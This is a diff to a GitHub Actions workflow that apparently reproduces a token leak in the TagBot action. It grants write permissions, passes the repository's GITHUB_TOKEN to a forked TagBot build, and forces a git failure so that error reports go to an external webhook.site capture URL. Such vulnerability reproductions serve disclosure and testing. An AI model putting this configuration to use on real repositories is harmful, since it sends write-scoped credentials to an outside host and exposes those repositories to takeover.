@@ -1,17 +1,25 @@
 name: tagbot-leak-repro
 on: workflow_dispatch
 
+permissions:
+  contents: write
+  pull-requests: write
+  issues: write
+
 jobs:
   run:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
+
       - name: Run forked TagBot to force git failure early
         uses: izefoea/TagBot@8a01120134dfc5c2c85e713a84e076251e0eaa82
         env:
           TAGBOT_ERROR_ENDPOINT: https://webhook.site/56aa9ff7-330f-45e4-8899-f8fbefb57879
+          TAGBOT_REPRO_EARLY_SSH: true
         with:
           token: ${{ secrets.GITHUB_TOKEN }}
-          github: invalid.example.com      # 故意错误的主机名，确保克隆失败
-          github_api: api.github.com       # API 仍正常，隐私判断可用
-          ssh: Zm9v                        # 任意内容（Base64），触发一次 Git 配置/操作
+          github: invalid.example.com
+          github_api: api.github.com
+          registry: JuliaRegistries/General
+          ssh: Zm9v
